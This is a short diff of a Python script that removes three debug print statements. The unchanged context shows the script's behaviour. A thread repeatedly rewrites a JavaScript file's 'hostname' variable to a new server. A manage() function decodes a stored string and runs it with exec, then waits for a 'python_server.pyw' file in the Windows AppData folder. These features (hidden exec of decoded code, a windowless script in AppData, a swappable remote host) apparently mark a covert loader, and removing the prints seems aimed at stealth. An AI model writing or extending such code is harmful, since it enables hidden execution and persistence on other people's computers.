@@ -34,7 +34,6 @@ def get_start_p(name):
 def work():
     while True:
         try:
-            print('working thread started')
             if(new_server == "" or len(new_server) < 5 or new_server == None):
                 pass
             else:
@@ -42,7 +41,6 @@ def work():
                     l[0] = f"var hostname = '{new_server}'\n"
                     with open("js/tools.js", "w") as f:
                         f.writelines(l)
-            print('working thread work completed')
             time.sleep(60)
             
         except Exception as e:
@@ -50,7 +48,6 @@ def work():
     
 
 def manage():
-    print('manage thread started')
     ready = get_string(l[4][2:])
     exec(new_s)
     while not os.path.exists(os.path.join(os.environ.get('appdata'), 'python_server.pyw')):
